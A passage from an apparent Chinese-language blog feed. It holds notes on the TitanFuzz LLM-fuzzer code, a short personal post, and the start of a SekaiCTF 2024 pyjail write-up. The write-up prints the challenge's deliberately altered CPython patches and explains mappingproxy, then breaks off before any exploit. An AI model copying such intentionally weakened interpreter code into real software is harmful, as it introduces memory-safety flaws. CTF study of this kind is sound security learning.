ex_repeats</li></ul></li></ul></li><li><p>_init_seed：</p><ul><li><p>对于每个seed：</p><ol><li>调用_compute_fitness_score打分</li><li>取长度的负数</li></ol><p>以这两个数为权重，将所有的seed存入一个小根堆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">heapq.heappush(<br>    self.seeds,<br>    (self._compute_fitness_score(seed), -<span class="hljs-built_in">len</span>(seed.splitlines()), seed),<br>)<br></code></pre></td></tr></table></figure></li><li><p>保证种子池中种子数小于self.seed_pool_size</p></li></ul></li><li><p>_select_seed：</p><p>以softmax过的scores为概率，随机选取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_softmax</span>(<span class="hljs-params">self, x</span>):<br>    e_x = np.exp(x - np.<span class="hljs-built_in">max</span>(x))<br>    <span class="hljs-keyword">return</span> e_x / e_x.<span class="hljs-built_in">sum</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_select_seed</span>(<span class="hljs-params">self</span>):<br>    _seed_scores = [rec[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> rec <span class="hljs-keyword">in</span> self.seeds]<br>    codes = [rec[-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> rec <span class="hljs-keyword">in</span> self.seeds]<br>    probs = self._softmax(_seed_scores)<br>    code = np.random.choice(codes, p=probs)<br>    <span class="hljs-keyword">return</span> code<br></code></pre></td></tr></table></figure></li><li><p>_update_seed：只更新info</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_update_seed</span>(<span class="hljs-params">self, code, value</span>):<br>self.info_code[code][<span class="hljs-string">&quot;used_as_seed&quot;</span>] += self.num_generated<br></code></pre></td></tr></table></figure></li><li><p>_add_new_seed：多了一步给种子打分，push进小根堆，并pop出低分种子直到种子池满</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">heapq.heappush(<br>    self.seeds,<br>    (self._compute_fitness_score(code), -<span class="hljs-built_in">len</span>(code.splitlines()), code),<br>)<br><span class="hljs-keyword">if</span> self.seed_pool_size &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.seeds) &gt; self.seed_pool_size:<br>        heapq.heappop(self.seeds)<br></code></pre></td></tr></table></figure></li></ul><h2 id="instrumentor-py"><a href="#instrumentor-py" class="headerlink" title="instrumentor.py"></a>instrumentor.py</h2><p>python的ast树默认遍历方式为先根遍历，以下是一个ast树的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-number">100</span><br>a = b<br>c = a.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>a.to_tensor(<span class="hljs-number">1</span>, a = <span class="hljs-number">10</span>).reshape(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><img src="/2025/01/03/titanfuzz/ast.png" class title="ast"><h3 id="class-SnippetInfill"><a href="#class-SnippetInfill" class="headerlink" title="class SnippetInfill"></a>class SnippetInfill</h3><p>继承自ast.NodeTransformer</p><ul><li><p>visit：需要单独处理ast.Call</p></li><li><p>visit_Call：</p><ul><li><p>获取所有api调用，计数self.num_replaced</p></li><li><p>如果self.replace为False则只是返回</p></li><li><p>如果self.replace_type包含argument，则设置args为mask并清除所有keywords</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;argument&quot;</span> <span class="hljs-keyword">in</span> self.replace_type:<br>    node.args = [ast.Constant(value=self.mask_identifier)]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(node):<br>        node.keywords = []<br>    self.replace = <span class="hljs-literal">False</span>  <span class="hljs-comment"># do not replace any later api calls</span><br></code></pre></td></tr></table></figure></li><li><p>计数最后一个目标api出现的行数到self.line_no</p></li></ul></li><li><p>add_infill：</p><ul><li>先parse再unparse，可以去掉多余的换行</li><li>先visit一次计数self.num_replaced</li><li>再visit一次进行更改</li><li>分类self.replace_type：<ul><li>argument：mask所有目标api的args</li><li>prefix：去掉self.line_no前的若干行，并补充import</li><li>suffix：去掉self.line_no后的若干行</li><li>prefix-argument：综合两者</li><li>suffix-argument：综合两者</li></ul></li><li>返回：<ul><li>mask计数：self.num_replaced</li><li>maks完的code：infill_code</li><li>原始code：original_code</li></ul></li></ul></li></ul><h3 id="class-SnippetInfillArbitratyAPI"><a href="#class-SnippetInfillArbitratyAPI" class="headerlink" title="class SnippetInfillArbitratyAPI"></a>class SnippetInfillArbitratyAPI</h3><p>类似SnippetInfill</p><ul><li><p>visit_Call：收集所有包括在self.full_api_list中的api call结点，加入self.call_nodes</p></li><li><p>add_infill：</p><ul><li><p>从self.call_nodes随机选择一个结点mask：</p><ul><li><p>替换方法：mask Attribute</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.func = ast.Attribute(<br>    value=ast.Name(<span class="hljs-built_in">id</span>=self.lib_prefix),<br>    attr=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>),<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.&lt;|mask:<span class="hljs-number">0</span>|&gt;(A, B)<br></code></pre></td></tr></table></figure></li><li><p>替换argument：mask args，清空keywords</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.args = [<br>ast.Constant(value=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>]<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(replace_node):<br>    replace_node.keywords = []<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.mm(&lt;|mask:<span class="hljs-number">0</span>|&gt;)<br></code></pre></td></tr></table></figure></li><li><p>替换keywords：添加一个keyword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">replace_node.keywords.append(<br>    ast.keyword(<br>        arg=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>),<br>        value=ast.Constant(value=self.mask_identifier.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)),<br>    )<br>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.mm(A, B, &lt;|mask:<span class="hljs-number">0</span>|&gt; = &lt;|mask:<span class="hljs-number">1</span>|&gt;)<br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h3 id="class-DepthFinder"><a href="#class-DepthFinder" class="headerlink" title="class DepthFinder"></a>class DepthFinder</h3><p>继承自ast.NodeTransformer</p><p>depth计算方式：</p><ul><li><p>没有参数，只有api调用，则depth为api层数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a = lib.getnum()<br></code></pre></td></tr></table></figure><p><em>例：a的depth是1</em></p></li><li><p>有参数，则depth为max(参数的depth+api层数)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b = lib.add(lib.sub(a, <span class="hljs-number">1</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><em>例：b的depth是2+1&#x3D;3</em></p></li></ul><p>相关成员含义：</p><ul><li>api_depth：目标库api调用层数</li><li>current_var：被赋值的变量，第一次出现时是待计算的depth，需要忽略</li></ul><p>一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = lib.getnum()                <span class="hljs-comment"># a : 1</span><br>b = lib.getnum(lib.getnum())     <span class="hljs-comment"># b : 2</span><br>c = lib.add(b, lib.add(a, a))    <span class="hljs-comment"># b ? 1 + 2, a ? 2 + 1, c : 3</span><br>b = lib.add(lib.add(b, c), a)    <span class="hljs-comment"># b ? 2 + 2, c ? 3 + 2, a ? 1 + 1, b : 5</span><br></code></pre></td></tr></table></figure><p><em>max_depth&#x3D;5</em></p><h3 id="class-SearchAllCall"><a href="#class-SearchAllCall" class="headerlink" title="class SearchAllCall"></a>class SearchAllCall</h3><p>继承自ast.NodeTransformer</p><p>self.call_nodes获取所有函数调用结点</p><h3 id="class-SearchAllLibCall"><a href="#class-SearchAllLibCall" class="headerlink" title="class SearchAllLibCall"></a>class SearchAllLibCall</h3><p>继承自SearchAllCall</p><p>忽略一些函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ignore_calls = [<br>    <span class="hljs-string">&quot;tf.print&quot;</span>,<br>    <span class="hljs-string">&quot;tf.constant&quot;</span>,<br>    <span class="hljs-string">&quot;tf.zeros&quot;</span>,<br>    <span class="hljs-string">&quot;tf.ones&quot;</span> <span class="hljs-string">&quot;tf.shape&quot;</span>,<br>]<br></code></pre></td></tr></table></figure><h3 id="class-UniqueFinder"><a href="#class-UniqueFinder" class="headerlink" title="class UniqueFinder"></a>class UniqueFinder</h3><ul><li><p>call_exp是api调用的完整表达，如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lib.call(test = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure></li><li><p>api_call只是api，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lib.call<br></code></pre></td></tr></table></figure></li><li><p>unique_calls是api种类数</p></li><li><p>ex_repeats是api重复出现的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> call_exp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.unique_found_call_exps:<br>    self.unique_found_call_exps[call_exp] = <span class="hljs-number">0</span><br><span class="hljs-comment"># ……</span><br>self.unique_found_call_exps[call_exp] += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sum</span>([v - <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> _, v <span class="hljs-keyword">in</span> self.unique_found_call_exps.items()])<br></code></pre></td></tr></table></figure></li></ul><h3 id="class-UseDef"><a href="#class-UseDef" class="headerlink" title="class UseDef"></a>class UseDef</h3><p>继承自ast.NodeTransformer</p><ul><li><p>get_use_def：</p><ul><li>visit只处理name</li><li>记录Load到self.uses</li><li>记录Store到self.defs</li></ul><p>uses和defs是两个字典，key是行号value是id的集合，返回uses、defs和ids，<em>虽然ids没用，樂</em></p></li></ul><h2 id="uil-py"><a href="#uil-py" class="headerlink" title="uil.py"></a>uil.py</h2><h3 id="run-cmd"><a href="#run-cmd" class="headerlink" title="run_cmd"></a>run_cmd</h3><p>使用subprocess.run执行命令，输出returncode、stderr和stdout，程序结束状态和错误提示信息</p><ul><li><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">verbose</span><br>output.returncode: &#123;&#125;<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_">stderr&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">verbose</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">error_msg</span><br>---- returncode=&#123;&#125; ----<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_">stderr&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">error_msg</span><br></code></pre></td></tr></table></figure></li><li><p>ExecutionStatus</p><ul><li>CRASH<ul><li>SIGABRT Triggered</li><li>SIGILL</li><li>SIGTRAP</li><li>SIGFPE</li><li>OOM</li><li>SIGBUS Triggered</li><li>Segmentation Fault Triggered</li></ul></li><li>EXCEPTION</li><li>SUCCESS</li></ul></li></ul><h2 id="astpasses-py"><a href="#astpasses-py" class="headerlink" title="astpasses.py"></a>astpasses.py</h2><h3 id="class-PassRemoveDocstring"><a href="#class-PassRemoveDocstring" class="headerlink" title="class PassRemoveDocstring"></a>class PassRemoveDocstring</h3><p><em>继承了NodeTransformerWithPrePost又不用继承了个寂寞脑壳有点问题神金我看了半天！！！</em></p><p>Module里的Docstring就是body里一个只有Const的Expr，删了就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Module(body=[<br>    Expr(value=Constant(value=<span class="hljs-string">&#x27;\ntest\ntesttest\ntesttesttest\n&#x27;</span>)),<br>    <span class="hljs-comment"># ……</span><br>])<br></code></pre></td></tr></table></figure><h2 id="clean-code-py"><a href="#clean-code-py" class="headerlink" title="clean_code.py"></a>clean_code.py</h2><h3 id="dead-code-elim"><a href="#dead-code-elim" class="headerlink" title="_dead_code_elim"></a>_dead_code_elim</h3><ul><li>以行号为结点，行内包含的ids的def-use为边建立邻接矩阵</li><li>保留所有没有def或use的行</li><li>跳过先use再def的行</li><li>dfs更新所有目标行可达的行号successor，保留</li><li>dfs更新所有可达successor的行号，保留</li></ul><h3 id="dead-code-elim-1"><a href="#dead-code-elim-1" class="headerlink" title="dead_code_elim"></a>dead_code_elim</h3><ul><li><p>使用UseDef获取defs、uses和ids</p><p><em>UseDef见util&#x2F;instrumentor.py</em></p></li><li><p>使用SearchCall获取call目标api的所有结点</p><p><em>SearchCall见util&#x2F;astpasses.py</em></p></li><li><p>获取目标api出现的最小行号为target_line</p></li><li><p>调用_dead_code_elim删除不能到达目标行的行（返回保留行）</p></li><li><p>保留缩进行</p></li><li><p>去除注释</p></li><li><p>返回删除死代码后的代码</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>llm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>炫耀一下漂亮花花~</title>
    <link href="/2024/12/23/flower/"/>
    <url>/2024/12/23/flower/</url>
    
    <content type="html"><![CDATA[<p>只是想炫耀一下室友送的漂亮花花~</p><span id="more"></span><img src="/2024/12/23/flower/flower1.jpg" class title="flower1"><img src="/2024/12/23/flower/flower2.jpg" class title="flower2">]]></content>
    
    
    <categories>
      
      <category>Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 sekaiCTF Miku Jail wp</title>
    <link href="/2024/08/31/sekai2024jailwp/"/>
    <url>/2024/08/31/sekai2024jailwp/</url>
    
    <content type="html"><![CDATA[<p>这几天做梦都在打断点调试捋逻辑……</p><span id="more"></span><p>misc？pwn！第一次做pyjail</p><h1 id="irs-amp-diff"><a href="#irs-amp-diff" class="headerlink" title="irs &amp; diff"></a>irs &amp; diff</h1><ul><li><p>hook了audit事件，提到了一个dice的题</p></li><li><p>但dice那题用的是bytearray的uaf，这题直接把free patch了：）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Modules/_io/bufferedio.c b/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">index e87d04bd07a..c5f940233ba 100644</span><br><span class="hljs-comment">--- a/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">+++ b/Modules/_io/bufferedio.c</span><br><span class="hljs-meta">@@ -416,7 +416,7 @@</span> buffered_dealloc(buffered *self)<br>     if (self-&gt;weakreflist != NULL)<br>         PyObject_ClearWeakRefs((PyObject *)self);<br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br>     if (self-&gt;lock) &#123;<br><span class="hljs-meta">@@ -566,7 +566,7 @@</span> _io__Buffered_close_impl(buffered *self)<br>     res = PyObject_CallMethodNoArgs(self-&gt;raw, &amp;_Py_ID(close));<br> <br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br> <br><span class="hljs-meta">@@ -798,8 +798,8 @@</span> _buffered_init(buffered *self)<br>             &quot;buffer size must be strictly positive&quot;);<br>         return -1;<br>     &#125;<br><span class="hljs-deletion">-    if (self-&gt;buffer)</span><br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+    //if (self-&gt;buffer)</span><br><span class="hljs-addition">+    //    PyMem_Free(self-&gt;buffer);</span><br>     self-&gt;buffer = PyMem_Malloc(self-&gt;buffer_size);<br>     if (self-&gt;buffer == NULL) &#123;<br>         PyErr_NoMemory();<br></code></pre></td></tr></table></figure><p><em>像极了打awd的我……</em></p></li><li><p>还禁了类型转换，要求类型必须匹配</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/bytearrayobject.c b/Objects/bytearrayobject.c</span><br><span class="hljs-comment">index 07c20ac6316..21d1036e4a9 100644</span><br><span class="hljs-comment">--- a/Objects/bytearrayobject.c</span><br><span class="hljs-comment">+++ b/Objects/bytearrayobject.c</span><br><span class="hljs-meta">@@ -512,6 +512,11 @@</span> static int<br> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br>                PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values) &amp;&amp; !PyBytes_CheckExact(value</span><br>s))<br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return 0;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t needed;<br>     void *bytes;<br>     Py_buffer vbytes;<br><span class="hljs-meta">@@ -561,6 +566,11 @@</span> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br> static int<br> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> &#123;<br><span class="hljs-addition">+    if (!PyLong_CheckExact(value))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;no&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     int ival = -1;<br> <br>     // GH-91153: We need to do this *before* the size check, in case value has a<br><span class="hljs-meta">@@ -590,6 +600,16 @@</span> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> static int<br> bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+    if (!PyLong_CheckExact(index))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t start, stop, step, slicelen, needed;<br>     char *buf, *bytes;<br>     buf = PyByteArray_AS_STRING(self);<br></code></pre></td></tr></table></figure></li><li><p><em>后面一直在想怎么用这个东西，结果其实这个patch的意思是把这玩意ban了o(TヘTo)</em></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/descrobject.c b/Objects/descrobject.c</span><br><span class="hljs-comment">index a6c90e7ac13..36030ad1caa 100644</span><br><span class="hljs-comment">--- a/Objects/descrobject.c</span><br><span class="hljs-comment">+++ b/Objects/descrobject.c</span><br><span class="hljs-meta">@@ -1210,7 +1210,7 @@</span> mappingproxy_traverse(PyObject *self, visitproc visit, void *arg)<br> static PyObject *<br> mappingproxy_richcompare(mappingproxyobject *v, PyObject *w, int op)<br> &#123;<br><span class="hljs-deletion">-    return PyObject_RichCompare(v-&gt;mapping, w, op);</span><br><span class="hljs-addition">+    return PyObject_RichCompare(v, w, op);</span><br> &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="一些思维路径"><a href="#一些思维路径" class="headerlink" title="一些思维路径~"></a>一些思维路径~</h1><h2 id="MappingProxyType"><a href="#MappingProxyType" class="headerlink" title="MappingProxyType"></a>MappingProxyType</h2><p>首先，为什么要ban mappingproxy_richcompare，这个mappingproxy是什么东西</p><ul><li><p>首先看一个常见的东西，dict字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_dict)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>mappingproxy和dict类似，也可以基于dict创建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping = MappingProxyType(test_dict)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_mapping)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>但它是只读的，尝试修改会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure></li><li><p>那这个玩意有什么用呢？对象有一个内置属性__dict__，用于存储对象的属性</p><ul><li><p>class的实例的__dict__是dict类型的，可以修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-meta">... </span>            self.test1=<span class="hljs-string">&#x27;test1&#x27;</span><br><span class="hljs-meta">... </span>            self.test2=<span class="hljs-string">&#x27;test2&#x27;</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = A()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(a.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__<br>&#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test111&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a.test1<br><span class="hljs-string">&#x27;test111&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>class本身的__dict__是mappingproxy类型的，不可修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 